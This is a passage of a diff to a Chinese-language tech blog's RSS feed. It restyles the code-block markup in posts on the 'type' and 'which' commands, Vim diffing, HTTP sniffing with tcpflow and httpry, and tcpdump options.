+0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20221110-which-on-an-aliased-command/</guid><description>&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.baeldung.com/linux/which-on-an-aliased-command" target="_blank" rel="noopener"&gt;如何在別名指令上使用 which&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h5 id="type"&gt;type&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; grep
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;grep is an &lt;span style="color:#e5c07b"&gt;alias&lt;/span&gt; &lt;span style="color:#c678dd"&gt;for&lt;/span&gt; grep --color&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;auto
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Bash&amp;#39;s type&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; -P grep
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/bin/grep
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Zsh&amp;#39;s type&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; -p grep
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;grep is /usr/bin/grep
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="gnu-which"&gt;GNU which&lt;/h5&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;which -a which
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;which: shell built-in &lt;span style="color:#e5c07b"&gt;command&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/bin/which
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;alias&lt;/span&gt; top10
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;top10&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;alias&lt;/span&gt; | /usr/bin/which -i top10
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;top10&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /usr/bin/uniq
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /usr/bin/sort
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; /usr/bin/head
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>使用 Vim 當作差異比對工具</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20220707-vim-diff-tool/</link><pubDate>Thu, 07 Jul 2022 17:36:22 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20220707-vim-diff-tool/</guid><description>&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-46eb4e0f9e92d9a3fd7cc2b58165eda9-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;type&lt;/span&gt; grep
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;grep is an &lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; grep --color&lt;span class="o"&gt;=&lt;/span&gt;auto
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Bash&amp;#39;s type&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;type&lt;/span&gt; -P grep
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/grep
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Zsh&amp;#39;s type&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;type&lt;/span&gt; -p grep
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;grep is /usr/bin/grep
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"type grep\ngrep is an alias for grep --color=auto\n\n\n# Bash's type\ntype -P grep\n/usr/bin/grep\n\n# Zsh's type\ntype -p grep\ngrep is /usr/bin/grep\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h5 id="gnu-which"&gt;GNU which&lt;/h5&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-46eb4e0f9e92d9a3fd7cc2b58165eda9-1"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;which -a which
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;which: shell built-in &lt;span class="nb"&gt;command&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/bin/which
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; top10
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;top10&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; /usr/bin/which -i top10
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;top10&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; /usr/bin/uniq
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; /usr/bin/sort
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; /usr/bin/head
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"which -a which\nwhich: shell built-in command\n/usr/bin/which\n\n\nalias top10\ntop10='print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10'\n\nalias | /usr/bin/which -i top10\ntop10='print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10'\n\t/usr/bin/uniq\n\t/usr/bin/sort\n\t/usr/bin/head\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;</description></item><item><title>使用 Vim 當作差異比對工具</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20220707-vim-diff-tool/</link><pubDate>Thu, 07 Jul 2022 17:36:22 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20220707-vim-diff-tool/</guid><description>&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.baeldung.com/linux/vim-diff-tool" target="_blank" rel="noopener"&gt;使用 Vim 當作差異比對工具&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h4 id="指令"&gt;指令&lt;/h4&gt;
@@ -289,13 +299,14 @@
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;apt/dnf install tcpflow&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ sudo tcpflow -p -c -i wlp0s20f3 port &lt;span style="color:#d19a66"&gt;80&lt;/span&gt; | grep -oE &lt;span style="color:#98c379"&gt;&amp;#39;(GET|POST) .* HTTP/1.[01]|Host: .*&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;reportfilename: ./report.xml
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tcpflow: listening on wlp0s20f3
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;GET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;GET /mirrors.txt HTTP/1.1
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-31c0429e7bad3b12d7182096476f60db-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo tcpflow -p -c -i wlp0s20f3 port &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep -oE &lt;span class="s1"&gt;&amp;#39;(GET|POST) .* HTTP/1.[01]|Host: .*&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;reportfilename: ./report.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tcpflow: listening on wlp0s20f3
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;GET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;GET /mirrors.txt HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"$ sudo tcpflow -p -c -i wlp0s20f3 port 80 | grep -oE '(GET|POST) .* HTTP/1.[01]|Host: .*'\nreportfilename: ./report.xml\ntcpflow: listening on wlp0s20f3\nGET /alexlarsson/flatpak/ubuntu/dists/focal/InRelease HTTP/1.1\n\nGET /mirrors.txt HTTP/1.1\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;ul&gt;
 &lt;li&gt;&lt;code&gt;-p&lt;/code&gt; 停用混雜模式&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-c&lt;/code&gt; 只輸出到主控台，不建立檔案&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-i&lt;/code&gt; 指定網路介面
@@ -306,29 +317,21 @@ grep 會接收 tcpflow 的輸出&lt;/li&gt;
 &lt;h3 id="httpry"&gt;httpry&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;https://github.com/jbittel/httpry.git&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo httpry -i wlp0s20f3
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;httpry version 0.1.8 -- HTTP logging and information retrieval tool
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Copyright &lt;span style="color:#56b6c2"&gt;(&lt;/span&gt;c&lt;span style="color:#56b6c2"&gt;)&lt;/span&gt; 2005-2014 Jason Bittel &amp;lt;jason.bittel@gmail.com&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Starting capture on wlp0s20f3 interface
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;2022-06-22 16:38:12.166 192.168.1.24 172.217.17.238 &amp;gt; GET google.com / HTTP/1.1 - -
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;2022-06-22 16:38:12.199 172.217.17.238 192.168.1.24 &amp;lt; - - - HTTP/1.0 400 Bad Request
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;2022-06-22 16:38:23.090 192.168.1.24 172.217.17.238 &amp;gt; POST google.com / HTTP/1.1 - -
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;2022-06-22 16:38:23.163 172.217.17.238 192.168.1.24 &amp;lt; - - - HTTP/1.1 405 Method Not Allowed
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Tcpdump 使用总结</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20220505-tcpdump/</link><pubDate>Thu, 05 May 2022 13:39:10 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20220505-tcpdump/</guid><description>&lt;ul&gt;
+&lt;/blockquote&gt;</description></item><item><title>Tcpdump 使用总结</title><link>https://linzeyan.github.io/zh-tw/posts/2022/20220505-tcpdump/</link><pubDate>Thu, 05 May 2022 13:39:10 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/2022/20220505-tcpdump/</guid><description>&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://markrepo.github.io/commands/2018/06/23/tcpdump/" target="_blank" rel="noopener"&gt;Tcpdump 使用总结&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id="命令使用"&gt;命令使用&lt;/h2&gt;
 &lt;p&gt;tcpdump 采用命令行方式，它的命令格式为：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tcpdump &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -AdDeflLnNOpqRStuUvxX &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -c count &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -C file_size &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -F file &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -i interface &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -m module &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -M secret &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -r file &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -s snaplen &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -T &lt;span style="color:#e5c07b"&gt;type&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -w file &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -W filecount &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -E spi@ipaddr algo:secret, ... &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -y datalinktype &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; -Z user &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#56b6c2"&gt;[&lt;/span&gt; expression &lt;span style="color:#56b6c2"&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="tcpdump-的简单选项介绍"&gt;tcpdump 的简单选项介绍&lt;/h3&gt;
+&lt;div class="code-block" data-code-block&gt;&lt;div class="code-block-full" id="code-block-7100f62c8ddea7d7ec6680fbffd9f397-0"&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tcpdump &lt;span class="o"&gt;[&lt;/span&gt; -AdDeflLnNOpqRStuUvxX &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -c count &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; -C file_size &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -F file &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; -i interface &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -m module &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -M secret &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; -r file &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -s snaplen &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -T &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -w file &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; -W filecount &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; -E spi@ipaddr algo:secret, ... &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; -y datalinktype &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -Z user &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;[&lt;/span&gt; expression &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type="application/json" class="code-block-data"&gt;{"copyButton":true,"expanded":false,"labels":{"code":"Code","copied":"Copied!","copy":"Copy","copyError":"Copy failed. Try again.","showAll":"Show all {count} lines","showLess":"Show fewer lines"},"language":"","preview":"","source":"tcpdump [ -AdDeflLnNOpqRStuUvxX ] [ -c count ]\n [ -C file_size ] [ -F file ]\n [ -i interface ] [ -m module ] [ -M secret ]\n [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]\n [ -W filecount ]\n [ -E spi@ipaddr algo:secret, ... ]\n [ -y datalinktype ] [ -Z user ]\n [ expression ]\n","title":"bash"}&lt;/script&gt;&lt;/div&gt;&lt;h3 id="tcpdump-的简单选项介绍"&gt;tcpdump 的简单选项介绍&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;-E spi@ipaddr algo:secret , ...&lt;/code&gt;，可通过&lt;code&gt;spi@ipaddr algo:secret&lt;/code&gt; 来解密 IPsec ESP 包。secret 为用于 ESP 的密钥，使用 ASCII 字符串方式表达。 如果以 &lt;code&gt;0x&lt;/code&gt; 开头，该密钥将以 16 进制方式读入。 除了以上的语法格式(指&lt;code&gt;spi@ipaddr algo:secret&lt;/code&gt;)， 还可以在后面添加一个语法输入文件名字供 tcpdump 使用(即把 spi@ipaddr algo:secret, … 中…换成一个语法文件名)。 在接收到第一个 ESP 包时会打开此文件， 所以最好此时把赋予 tcpdump 的一些特权取消(可理解为，这样防范之后，当该文件为恶意编写时，不至于造成过大损害)。&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;-T type&lt;/code&gt; 强制 tcpdump 按 type 指定的协议所描述的包结构来分析收到的数据包。 目前已知的 type 可取的协议为:
